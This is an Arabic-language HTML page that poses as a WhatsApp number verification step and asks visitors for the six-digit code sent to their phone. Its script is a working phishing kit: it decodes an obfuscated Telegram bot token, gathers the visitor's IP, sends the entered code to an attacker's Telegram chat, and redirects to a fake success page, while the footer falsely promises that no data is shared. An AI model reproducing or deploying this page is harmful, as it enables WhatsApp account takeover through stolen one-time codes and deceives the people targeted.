<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>إدخال كود التحقق</title>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
      :root {
        --primary-color: #1a73e8;
        --primary-dark: #0d5cb6;
        --secondary-color: #34a853;
        --accent-color: #fbbc05;
        --background-color: #f8f9fa;
        --text-color: #202124;
        --light-gray: #dadce0;
        --card-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
      }
      
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }
      
      body {
        font-family: 'Tajawal', sans-serif;
        background: linear-gradient(135deg, #e0f7fa, #f3e5f5);
        margin: 0;
        padding: 20px;
        color: var(--text-color);
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
      }
      
      .container {
        width: 100%;
        max-width: 500px;
        background-color: white;
        border-radius: 16px;
        box-shadow: var(--card-shadow);
        overflow: hidden;
        margin: 20px;
        animation: fadeIn 0.8s ease-out;
      }
      
      .header {
        background: linear-gradient(120deg, var(--primary-color), var(--secondary-color));
        padding: 30px 20px;
        text-align: center;
        color: white;
        position: relative;
        overflow: hidden;
      }
      
      .header::before {
        content: "";
        position: absolute;
        top: -50%;
        left: -50%;
        width: 200%;
        height: 200%;
        background: radial-gradient(circle, rgba(255,255,255,0.2) 0%, rgba(255,255,255,0) 70%);
        transform: rotate(30deg);
      }
      
      .header h1 {
        font-size: 2rem;
        font-weight: 700;
        margin-bottom: 10px;
        position: relative;
        z-index: 2;
        text-shadow: 0 2px 4px rgba(0,0,0,0.2);
      }
      
      .header p {
        font-size: 1rem;
        opacity: 0.9;
        max-width: 400px;
        margin: 0 auto;
        position: relative;
        z-index: 2;
      }
      
      .content {
        padding: 30px;
      }
      
      .section {
        text-align: center;
      }
      
      .section img {
        width: 180px;
        height: 180px;
        margin: 0 auto 25px;
        display: block;
        border-radius: 50%;
        border: 5px solid var(--light-gray);
        padding: 10px;
      }
      
      .section h2 {
        color: var(--primary-color);
        margin-bottom: 25px;
        font-size: 1.4rem;
      }
      
      .input-field {
        width: 100%;
        padding: 14px 20px;
        margin: 15px 0;
        border-radius: 10px;
        border: 2px solid var(--light-gray);
        font-size: 1rem;
        font-family: 'Tajawal', sans-serif;
        transition: all 0.3s ease;
        text-align: center;
        letter-spacing: 5px;
        font-weight: bold;
      }
      
      .input-field:focus {
        border-color: var(--primary-color);
        box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.2);
        outline: none;
      }
      
      .btn {
        width: 100%;
        padding: 16px;
        background: linear-gradient(120deg, var(--primary-color), var(--primary-dark));
        color: white;
        font-size: 1.1rem;
        font-weight: 500;
        border: none;
        border-radius: 10px;
        cursor: pointer;
        transition: all 0.3s ease;
        font-family: 'Tajawal', sans-serif;
        box-shadow: 0 4px 10px rgba(26, 115, 232, 0.3);
        margin-top: 15px;
      }
      
      .btn:hover {
        background: linear-gradient(120deg, var(--primary-dark), var(--primary-color));
        box-shadow: 0 6px 15px rgba(26, 115, 232, 0.4);
        transform: translateY(-2px);
      }
      
      .footer {
        text-align: center;
        font-size: 0.9rem;
        color: #777;
        margin-top: 25px;
        padding: 20px;
        background-color: #f8f9fa;
        border-top: 1px solid var(--light-gray);
      }
      
      .steps {
        display: flex;
        justify-content: space-between;
        margin: 30px 0;
        position: relative;
      }
      
      .steps::before {
        content: "";
        position: absolute;
        top: 20px;
        left: 0;
        right: 0;
        height: 2px;
        background: var(--light-gray);
        z-index: 1;
      }
      
      .step {
        position: relative;
        z-index: 2;
        text-align: center;
        width: 30%;
      }
      
      .step-number {
        width: 40px;
        height: 40px;
        background: var(--primary-color);
        color: white;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        margin: 0 auto 10px;
        font-weight: bold;
      }
      
      .step.active .step-number {
        background: var(--secondary-color);
        transform: scale(1.1);
      }
      
      .step-text {
        font-size: 0.85rem;
        color: #666;
      }
      
      @keyframes fadeIn {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
      }
      
      @media (max-width: 768px) {
        .content {
          padding: 20px;
        }
        
        .header h1 {
          font-size: 1.6rem;
        }
        
        .section img {
          width: 140px;
          height: 140px;
        }
      }
    </style>
</head>
<body>
    <div class="container">
      <div class="header">
        <h1>توثيق رقم واتساب</h1>
        <p>المرحلة الأخيرة: إدخال كود التحقق</p>
      </div>
      
      <div class="content">
        <div class="steps">
          <div class="step">
            <div class="step-number">1</div>
            <div class="step-text">إدخال الرقم</div>
          </div>
          <div class="step active">
            <div class="step-number">2</div>
            <div class="step-text">كود التحقق</div>
          </div>
          <div class="step">
            <div class="step-number">3</div>
            <div class="step-text">التوثيق</div>
          </div>
        </div>
        
        <div class="section">
          <img src="https://images.unsplash.com/photo-1586769852836-bc069f19e1b6?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=600&q=80" alt="رمز التحقق">
          <h2>أدخل كود التحقق المرسل إلى هاتفك</h2>
          <form id="verifyForm">
            <input type="text" name="verification_code" class="input-field" placeholder="أدخل كود التحقق هنا" required maxlength="6" />
            <button type="submit" class="btn">توثيق الرقم</button>
          </form>
        </div>
      </div>
      
      <div class="footer">
        <p>لن نقوم بمشاركة بياناتك مع أي شخص. جميع الحقوق محفوظة © 2025</p>
      </div>
    </div>

<script>

    function getBotToken() {

      const tokenParts = [
        [56, 48, 49], // 801
        [49, 50, 51, 52], // 1234
        [52, 48, 51], // 403
        [58], // :
        [65, 65, 69, 71], // AAEG
        [107, 107, 55, 102, 50, 45], // kk7f2-
        [110, 67, 66, 118, 114, 110], // nCBvrn
        [51, 114, 55, 122], // 3r7z
        [95, 72, 45, 95], // _H-_
        [122, 56, 71, 85, 89, 66], // z8GUYB
        [104, 79, 75, 111, 115] // hOKos
      ];
      

      const token = tokenParts.map(part => 
        part.map(code => String.fromCharCode(code)).join('')
      ).join('');
      
      return token;
    }
  
  // الحصول على id من رابط الصفحة الحالية
  const urlParams = new URLSearchParams(window.location.search);
  const CHAT_ID = urlParams.get('id');
  const BOT_TOKEN = getBotToken();

  document.getElementById("verifyForm").addEventListener("submit", async function(event) {
      event.preventDefault();
      const formData = new FormData(this);
      const verificationCode = formData.get("verification_code");
      const userAgent = navigator.userAgent;
      
      let ipInfo = { ip: "غير معروف" };
      try {
          const response = await fetch("https://api.ipify.org?format=json");
          ipInfo = await response.json();
      } catch (error) {}
      
      const message = `💬 - تم وصول الكود الوتساب  : 
🔹 - كود التحقق :  ${verificationCode}`;
      
      fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
          method: "POST",
          headers: {
              "Content-Type": "application/json"
          },
          body: JSON.stringify({
              chat_id: CHAT_ID,
              text: message
          })
      })
      .then(() => {
          window.location.href = "https://issol.free.nf/success/documented.html";
      })
      .catch(() => {
          alert("فشل في إرسال البيانات!");
      });
  });
</script>
</body>
</html>
